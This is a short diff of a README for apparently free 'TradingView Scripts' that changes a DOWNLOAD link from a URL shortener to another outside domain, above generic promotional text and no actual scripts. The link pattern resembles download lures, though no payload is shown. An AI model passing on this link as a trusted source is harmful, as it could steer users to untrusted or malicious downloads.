@@ -1,5 +1,6 @@
-[DOWNLOAD](https://goo.su/YXlm)
+[DOWNLOAD](https://gitdwnl.com/latest)
 ---
+
 # TradingView Scripts
 
 Enhance your trading strategies with our collection of TradingView scripts. These scripts are designed to provide advanced analysis and automation, helping you make informed decisions and maximize your trading potential.
